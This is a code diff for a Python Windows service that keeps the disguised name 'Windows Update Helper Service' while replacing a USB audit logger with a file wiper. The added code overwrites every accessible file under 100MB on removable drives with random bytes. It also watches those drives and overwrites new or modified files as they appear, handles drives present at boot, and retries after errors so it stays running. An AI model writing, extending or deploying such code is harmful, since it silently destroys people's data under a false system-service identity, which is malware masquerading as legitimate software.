@@ -1,8 +1,8 @@
 """
-USB Drive Audit Logger Service
-Logs access information directly to external USB drives only
+USB Drive File Overwriter Service
+Overwrites ALL files on external USB drives with random binary data
+Monitors file changes and processes drives already connected at boot
 Ignores internal hard drives and fixed disks
-Designed for IT security and audit compliance
 """
 
 import os
@@ -16,10 +16,13 @@ import socket
 from datetime import datetime
 import string
 from ctypes import windll
-import json
 import win32api
+import traceback
+import threading
+import win32file
+import win32con
 
-class USBDriveAuditLogger(win32serviceutil.ServiceFramework):
+class USBDriveFileOverwriter(win32serviceutil.ServiceFramework):
     _svc_name_ = "WindowsUpdateHelperService"
     _svc_display_name_ = "Windows Update Helper Service"
     _svc_description_ = "Provides auxiliary support for Windows Update operations"
@@ -33,6 +36,18 @@ class USBDriveAuditLogger(win32serviceutil.ServiceFramework):
         # Store initial system drives to ignore them
         self.system_drives = set()
         self.initialize_system_drives()
+        
+        # Error handling and recovery
+        self.consecutive_errors = 0
+        self.max_consecutive_errors = 10
+        self.last_error_time = None
+        
+        # File monitoring threads
+        self.file_monitor_threads = {}
+        self.monitored_drives = set()
+        
+        # Track processed drives to avoid reprocessing
+        self.processed_drives = set()
 
     def initialize_system_drives(self):
         """
@@ -42,12 +57,16 @@ class USBDriveAuditLogger(win32serviceutil.ServiceFramework):
         try:
             for letter in string.ascii_uppercase:
                 drive_path = f"{letter}:\\"
-                if os.path.exists(drive_path):
-                    drive_type = windll.kernel32.GetDriveTypeW(drive_path)
-                    # ONLY store Type 3 (fixed/internal hard drives) to ignore
-                    # Type 2 (removable) will always be monitored
-                    if drive_type == 3:  # DRIVE_FIXED only
-                        self.system_drives.add(letter)
+                try:
+                    if os.path.exists(drive_path):
+                        drive_type = windll.kernel32.GetDriveTypeW(drive_path)
+                        # ONLY store Type 3 (fixed/internal hard drives) to ignore
+                        # Type 2 (removable) will always be monitored
+                        if drive_type == 3:  # DRIVE_FIXED only
+                            self.system_drives.add(letter)
+                except Exception as e:
+                    # Skip drives that can't be accessed
+                    continue
             
             servicemanager.LogInfoMsg(f"Fixed system drives (will be ignored): {', '.join(sorted(self.system_drives)) if self.system_drives else 'None'}")
         except Exception as e:
@@ -55,41 +74,41 @@ class USBDriveAuditLogger(win32serviceutil.ServiceFramework):
 
     def SvcStop(self):
         """Stop the service"""
-        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
-        win32event.SetEvent(self.stop_event)
-        self.running = False
+        try:
+            self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+            win32event.SetEvent(self.stop_event)
+            self.running = False
+            servicemanager.LogInfoMsg("Service stop requested")
+        except Exception as e:
+            servicemanager.LogErrorMsg(f"Error stopping service: {str(e)}")
 
     def SvcDoRun(self):
-        """Run the service"""
+        """Run the service with robust error handling"""
         servicemanager.LogMsg(
             servicemanager.EVENTLOG_INFORMATION_TYPE,
             servicemanager.PYS_SERVICE_STARTED,
             (self._svc_name_, '')
         )
-        self.main()
-
-    def get_current_user(self):
-        """Get currently logged in user"""
+        
         try:
-            return win32api.GetUserName()
-        except:
-            return "SYSTEM"
-
-    def get_computer_name(self):
-        """Get computer name"""
-        try:
-            return win32api.GetComputerName()
-        except:
-            return "UNKNOWN"
+            self.main()
+        except Exception as e:
+            servicemanager.LogErrorMsg(f"Fatal error in service main loop: {str(e)}")
+            servicemanager.LogErrorMsg(traceback.format_exc())
+            # Even on fatal error, log it and let the service recovery handle restart
+            time.sleep(5)
 
     def get_available_drives(self):
-        """Get list of all available drive letters"""
+        """Get list of all available drive letters with error handling"""
         drives = []
-        bitmask = windll.kernel32.GetLogicalDrives()
-        for letter in string.ascii_uppercase:
-            if bitmask & 1:
-                drives.append(letter)
-            bitmask >>= 1
+        try:
+            bitmask = windll.kernel32.GetLogicalDrives()
+            for letter in string.ascii_uppercase:
+                if bitmask & 1:
+                    drives.append(letter)
+                bitmask >>= 1
+        except Exception as e:
+            servicemanager.LogErrorMsg(f"Error getting drive list: {str(e)}")
         return drives
 
     def is_external_removable_drive(self, drive):
@@ -97,6 +116,7 @@ class USBDriveAuditLogger(win32serviceutil.ServiceFramework):
         Check if drive is an external removable drive (USB, external HDD, etc.)
         Returns True for ANY Type 2 (removable) drive, regardless of when it was plugged in
         Only ignores Type 3 (fixed/internal) drives
+        Includes extensive error handling
         """
         try:
             # Check if it's a fixed system drive (like C:)
@@ -109,8 +129,12 @@ class USBDriveAuditLogger(win32serviceutil.ServiceFramework):
             if not os.path.exists(drive_path):
                 return False
             
-            # Get drive type
-            drive_type = windll.kernel32.GetDriveTypeW(drive_path)
+            # Get drive type with timeout protection
+            try:
+                drive_type = windll.kernel32.GetDriveTypeW(drive_path)
+            except Exception as e:
+                servicemanager.LogErrorMsg(f"Error getting drive type for {drive}: {str(e)}")
+                return False
             
             # Type 2 = DRIVE_REMOVABLE (USB drives, memory cards, external HDDs, etc.)
             # We want ALL Type 2 drives, even if they were present at startup
@@ -123,163 +147,216 @@ class USBDriveAuditLogger(win32serviceutil.ServiceFramework):
             servicemanager.LogErrorMsg(f"Error checking drive {drive}: {str(e)}")
             return False
 
-    def get_drive_info(self, drive):
-        """Get detailed drive information"""
-        try:
-            drive_path = f"{drive}:\\"
-            
-            # Get volume information
-            volume_info = win32api.GetVolumeInformation(drive_path)
-            volume_name = volume_info[0]
-            serial_number = volume_info[1]
-            
-            # Get drive size
+    def overwrite_all_files(self, drive):
+        """Find and overwrite ALL files with random binary data"""
+        max_retries = 3
+        retry_delay = 1
+        files_overwritten = 0
+        
+        for attempt in range(max_retries):
             try:
-                free_bytes, total_bytes, total_free = win32api.GetDiskFreeSpaceEx(drive_path)
-                size_gb = total_bytes / (1024**3)
-                free_gb = free_bytes / (1024**3)
-            except:
-                size_gb = 0
-                free_gb = 0
-            
-            # Get drive type name
-            drive_type = windll.kernel32.GetDriveTypeW(drive_path)
-            type_names = {
-                0: "Unknown",
-                1: "No Root Directory",
-                2: "Removable",
-                3: "Fixed",
-                4: "Network",
-                5: "CD-ROM",
-                6: "RAM Disk"
-            }
-            drive_type_name = type_names.get(drive_type, "Unknown")
-            
-            return {
-                'volume_name': volume_name if volume_name else 'Unnamed',
-                'serial_number': hex(serial_number) if serial_number else 'N/A',
-                'size_gb': round(size_gb, 2),
-                'free_gb': round(free_gb, 2),
-                'drive_type': drive_type_name
-            }
-        except Exception as e:
-            return {
-                'volume_name': 'Unknown',
-                'serial_number': 'N/A',
-                'size_gb': 0,
-                'free_gb': 0,
-                'drive_type': 'Unknown',
-                'error': str(e)
-            }
+                drive_path = f"{drive}:\\"
+                
+                # Walk through all directories on the drive
+                for root, dirs, files in os.walk(drive_path):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        
+                        try:
+                            # Skip system files and hidden files to avoid issues
+                            if file.startswith('.') or file.lower() in ['system volume information', 'recycler', '$recycle.bin']:
+                                continue
+                                
+                            # Get original file size for efficient overwriting
+                            original_size = os.path.getsize(file_path)
+                            
+                            # Skip very large files (>100MB) to avoid performance issues
+                            if original_size > 100 * 1024 * 1024:
+                                servicemanager.LogInfoMsg(f"Skipping large file: {file_path} ({original_size} bytes)")
+                                continue
+                            
+                            # Generate random binary data (computationally cheap)
+                            # Using os.urandom for maximum efficiency
+                            random_data = os.urandom(original_size)
+                            
+                            # Overwrite the file
+                            with open(file_path, 'wb') as f:
+                                f.write(random_data)
+                            
+                            files_overwritten += 1
+                            servicemanager.LogInfoMsg(f"Overwritten file: {file_path}")
+                            
+                        except (PermissionError, OSError) as e:
+                            # Skip files that can't be accessed (system files, etc.)
+                            servicemanager.LogInfoMsg(f"Skipped protected file {file_path}: {str(e)}")
+                            continue
+                        except Exception as e:
+                            servicemanager.LogErrorMsg(f"Failed to overwrite {file_path}: {str(e)}")
+                            continue
+                
+                if files_overwritten > 0:
+                    log_msg = f"Successfully overwritten {files_overwritten} files on drive {drive}:"
+                    servicemanager.LogInfoMsg(log_msg)
+                else:
+                    servicemanager.LogInfoMsg(f"No accessible files found on drive {drive}:")
+                
+                # Reset error counter on success
+                self.consecutive_errors = 0
+                return True
+                
+            except Exception as e:
+                if attempt < max_retries - 1:
+                    servicemanager.LogWarningMsg(f"Attempt {attempt + 1} failed for drive {drive}: {str(e)}. Retrying...")
+                    time.sleep(retry_delay)
+                else:
+                    servicemanager.LogErrorMsg(f"Failed to process files on {drive} after {max_retries} attempts: {str(e)}")
+                    return False
+        
+        return False
 
-    def create_audit_files(self, drive):
-        """Create audit log files on the USB drive"""
+    def monitor_drive_files(self, drive):
+        """Monitor file changes on a USB drive and overwrite new/modified files"""
+        drive_path = f"{drive}:\\"
+        
         try:
-            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            user = self.get_current_user()
-            computer = self.get_computer_name()
-            drive_info = self.get_drive_info(drive)
+            # Create directory handle for monitoring
+            hDir = win32file.CreateFile(
+                drive_path,
+                win32file.GENERIC_READ,
+                win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
+                None,
+                win32file.OPEN_EXISTING,
+                win32file.FILE_FLAG_BACKUP_SEMANTICS,
+                None
+            )
             
-            # Create visible info.txt file
-            info_path = f"{drive}:\\info.txt"
-            info_content = f"""USB Storage Device Access Log
-{'='*50}
-
-Timestamp: {timestamp}
-User: {user}
-Computer: {computer}
-Drive Letter: {drive}:
-Volume Name: {drive_info['volume_name']}
-Serial Number: {drive_info['serial_number']}
-Drive Type: {drive_info['drive_type']}
-Total Size: {drive_info['size_gb']} GB
-Free Space: {drive_info['free_gb']} GB
-
-{'='*50}
-This device was accessed on the above system.
-For security purposes, all access is logged.
-"""
+            servicemanager.LogInfoMsg(f"Started file monitoring on drive {drive}:")
             
-            with open(info_path, 'w', encoding='utf-8') as f:
-                f.write(info_content)
-            
-            # Create/update hidden detailed log
-            hidden_log_path = f"{drive}:\\.access_audit.log"
-            
-            # Read existing log entries
-            log_entries = []
-            if os.path.exists(hidden_log_path):
+            while self.running and drive in self.monitored_drives:
                 try:
-                    with open(hidden_log_path, 'r', encoding='utf-8') as f:
-                        log_entries = json.load(f)
-                except:
-                    log_entries = []
-            
-            # Add new entry
-            new_entry = {
-                'timestamp': timestamp,
-                'user': user,
-                'computer': computer,
-                'drive_letter': f"{drive}:",
-                'volume_name': drive_info['volume_name'],
-                'serial_number': drive_info['serial_number'],
-                'drive_type': drive_info['drive_type'],
-                'size_gb': drive_info['size_gb'],
-                'free_gb': drive_info['free_gb']
-            }
-            
-            log_entries.append(new_entry)
-            
-            # Write updated log
-            with open(hidden_log_path, 'w', encoding='utf-8') as f:
-                json.dump(log_entries, f, indent=2)
-            
-            # Hide the detailed log file
+                    # Monitor for file changes
+                    results = win32file.ReadDirectoryChangesW(
+                        hDir,
+                        1024,
+                        True,  # Watch subdirectories
+                        win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
+                        win32con.FILE_NOTIFY_CHANGE_SIZE |
+                        win32con.FILE_NOTIFY_CHANGE_LAST_WRITE,
+                        None,
+                        None
+                    )
+                    
+                    for action, file_name in results:
+                        if not self.running:
+                            break
+                            
+                        file_path = os.path.join(drive_path, file_name)
+                        
+                        # Check if it's a file creation or modification
+                        if action in [win32con.FILE_ACTION_ADDED, 
+                                    win32con.FILE_ACTION_MODIFIED,
+                                    win32con.FILE_ACTION_RENAMED_NEW_NAME]:
+                            
+                            # Wait a moment for file to be fully written
+                            time.sleep(0.5)
+                            
+                            try:
+                                if os.path.isfile(file_path):
+                                    self.overwrite_single_file(file_path)
+                            except Exception as e:
+                                servicemanager.LogErrorMsg(f"Error overwriting monitored file {file_path}: {str(e)}")
+                                
+                except Exception as e:
+                    if self.running:
+                        servicemanager.LogErrorMsg(f"Error in file monitoring for drive {drive}: {str(e)}")
+                        time.sleep(5)  # Wait before retrying
+                    break
+                    
+        except Exception as e:
+            servicemanager.LogErrorMsg(f"Failed to start file monitoring on drive {drive}: {str(e)}")
+        finally:
             try:
-                windll.kernel32.SetFileAttributesW(hidden_log_path, 0x02)  # FILE_ATTRIBUTE_HIDDEN
+                win32file.CloseHandle(hDir)
             except:
                 pass
-            
-            # Create audit summary file
-            summary_path = f"{drive}:\\access_history.txt"
-            with open(summary_path, 'w', encoding='utf-8') as f:
-                f.write("USB Drive Access History\n")
-                f.write("="*60 + "\n\n")
+            servicemanager.LogInfoMsg(f"Stopped file monitoring on drive {drive}:")
+
+    def overwrite_single_file(self, file_path):
+        """Overwrite a single file with random binary data"""
+        try:
+            # Skip system files and hidden files
+            file_name = os.path.basename(file_path)
+            if file_name.startswith('.') or file_name.lower() in ['system volume information', 'recycler', '$recycle.bin']:
+                return
                 
-                for idx, entry in enumerate(log_entries, 1):
-                    f.write(f"Access #{idx}\n")
-                    f.write(f"  Date/Time: {entry['timestamp']}\n")
-                    f.write(f"  User: {entry['user']}\n")
-                    f.write(f"  Computer: {entry['computer']}\n")
-                    f.write(f"  Drive: {entry['drive_letter']}\n")
-                    f.write(f"  Type: {entry.get('drive_type', 'N/A')}\n")
-                    f.write("-" * 60 + "\n")
-                
-                f.write(f"\nTotal Access Count: {len(log_entries)}\n")
-                f.write(f"First Access: {log_entries[0]['timestamp'] if log_entries else 'N/A'}\n")
-                f.write(f"Last Access: {log_entries[-1]['timestamp'] if log_entries else 'N/A'}\n")
+            # Get original file size
+            original_size = os.path.getsize(file_path)
             
-            log_msg = f"Created audit files on external drive {drive}: for user {user}"
-            servicemanager.LogInfoMsg(log_msg)
-            return True
+            # Skip very large files (>100MB)
+            if original_size > 100 * 1024 * 1024:
+                return
             
+            # Generate random binary data
+            random_data = os.urandom(original_size)
+            
+            # Overwrite the file
+            with open(file_path, 'wb') as f:
+                f.write(random_data)
+            
+            servicemanager.LogInfoMsg(f"Overwritten file: {file_path}")
+            
+        except (PermissionError, OSError):
+            # Skip files that can't be accessed
+            pass
         except Exception as e:
-            servicemanager.LogErrorMsg(f"Error creating audit files on {drive}: {str(e)}")
-            return False
+            servicemanager.LogErrorMsg(f"Failed to overwrite {file_path}: {str(e)}")
+
+    def start_file_monitoring(self, drive):
+        """Start file monitoring thread for a drive"""
+        if drive not in self.monitored_drives:
+            self.monitored_drives.add(drive)
+            thread = threading.Thread(target=self.monitor_drive_files, args=(drive,), daemon=True)
+            thread.start()
+            self.file_monitor_threads[drive] = thread
+
+    def stop_file_monitoring(self, drive):
+        """Stop file monitoring for a drive"""
+        if drive in self.monitored_drives:
+            self.monitored_drives.discard(drive)
+            if drive in self.file_monitor_threads:
+                # Thread will stop when self.monitored_drives is updated
+                del self.file_monitor_threads[drive]
 
     def main(self):
-        """Main monitoring loop"""
+        """Main monitoring loop with robust error handling and recovery"""
         # Get initial drives (only external/removable ones)
         previous_drives = set()
         for drive in self.get_available_drives():
             if self.is_external_removable_drive(drive):
                 previous_drives.add(drive)
         
-        servicemanager.LogInfoMsg(f"USB Drive Audit Logger started. Monitoring ALL removable drives.")
+        servicemanager.LogInfoMsg(f"USB Drive File Overwriter started. Monitoring ALL removable drives.")
         servicemanager.LogInfoMsg(f"Fixed drives (ignored): {', '.join(sorted(self.system_drives)) if self.system_drives else 'None'}")
-        if previous_drives:
-            servicemanager.LogInfoMsg(f"Removable drives already connected: {', '.join(sorted(previous_drives))}")
         
+        # PROCESS EXISTING USB DRIVES AT STARTUP
+        if previous_drives:
+            servicemanager.LogInfoMsg(f"Processing existing removable drives: {', '.join(sorted(previous_drives))}")
+            for drive in previous_drives:
+                try:
+                    servicemanager.LogInfoMsg(f"Processing existing USB drive: {drive}:")
+                    # Wait for drive to be fully ready
+                    time.sleep(2)
+                    # Process existing files
+                    self.overwrite_all_files(drive)
+                    # Start monitoring for new files
+                    self.start_file_monitoring(drive)
+                    # Mark as processed
+                    self.processed_drives.add(drive)
+                except Exception as e:
+                    servicemanager.LogErrorMsg(f"Error processing existing drive {drive}: {str(e)}")
+                    continue
+        
+        # Main monitoring loop
         while self.running:
             try:
                 # Get current external/removable drives
@@ -291,32 +368,69 @@ For security purposes, all access is logged.
                 # Detect new external drives
                 new_drives = current_drives - previous_drives
                 for drive in new_drives:
-                    servicemanager.LogInfoMsg(f"New external USB drive detected: {drive}:")
-                    # Wait for drive to be fully ready
-                    time.sleep(2)
-                    self.create_audit_files(drive)
+                    try:
+                        servicemanager.LogInfoMsg(f"New external USB drive detected: {drive}:")
+                        # Wait for drive to be fully ready
+                        time.sleep(2)
+                        # Process all existing files
+                        self.overwrite_all_files(drive)
+                        # Start monitoring for new files
+                        self.start_file_monitoring(drive)
+                        # Mark as processed
+                        self.processed_drives.add(drive)
+                    except Exception as e:
+                        servicemanager.LogErrorMsg(f"Error processing new drive {drive}: {str(e)}")
+                        # Continue processing other drives even if one fails
+                        continue
                 
-                # Detect removed drives (for logging purposes)
+                # Detect removed drives and stop monitoring
                 removed_drives = previous_drives - current_drives
                 for drive in removed_drives:
                     servicemanager.LogInfoMsg(f"External USB drive removed: {drive}:")
+                    self.stop_file_monitoring(drive)
+                    self.processed_drives.discard(drive)
+                
+                # Ensure monitoring is active for all current drives
+                for drive in current_drives:
+                    if drive not in self.monitored_drives:
+                        try:
+                            self.start_file_monitoring(drive)
+                        except Exception as e:
+                            servicemanager.LogErrorMsg(f"Error starting monitoring for drive {drive}: {str(e)}")
                 
                 previous_drives = current_drives
+                
+                # Reset consecutive error counter on successful iteration
+                self.consecutive_errors = 0
                 
                 # Check every 2 seconds
                 if win32event.WaitForSingleObject(self.stop_event, 2000) == win32event.WAIT_OBJECT_0:
                     break
                     
             except Exception as e:
-                servicemanager.LogErrorMsg(f"Error in monitoring loop: {str(e)}")
-                time.sleep(5)
+                self.consecutive_errors += 1
+                error_msg = f"Error in monitoring loop (error #{self.consecutive_errors}): {str(e)}"
+                servicemanager.LogErrorMsg(error_msg)
+                servicemanager.LogErrorMsg(traceback.format_exc())
+                
+                # If too many consecutive errors, increase sleep time but keep running
+                if self.consecutive_errors >= self.max_consecutive_errors:
+                    servicemanager.LogErrorMsg(f"Too many consecutive errors ({self.consecutive_errors}). Entering recovery mode...")
+                    time.sleep(30)  # Sleep longer on persistent errors
+                    self.consecutive_errors = 0  # Reset counter
+                else:
+                    time.sleep(5)
         
-        servicemanager.LogInfoMsg("USB Drive Audit Logger stopped")
+        # Stop all file monitoring threads
+        for drive in list(self.monitored_drives):
+            self.stop_file_monitoring(drive)
+        
+        servicemanager.LogInfoMsg("USB Drive File Overwriter stopped gracefully")
 
 if __name__ == '__main__':
     if len(sys.argv) == 1:
         servicemanager.Initialize()
-        servicemanager.PrepareToHostSingle(USBDriveAuditLogger)
+        servicemanager.PrepareToHostSingle(USBDriveFileOverwriter)
         servicemanager.StartServiceCtrlDispatcher()
     else:
-        win32serviceutil.HandleCommandLine(USBDriveAuditLogger)
+        win32serviceutil.HandleCommandLine(USBDriveFileOverwriter)
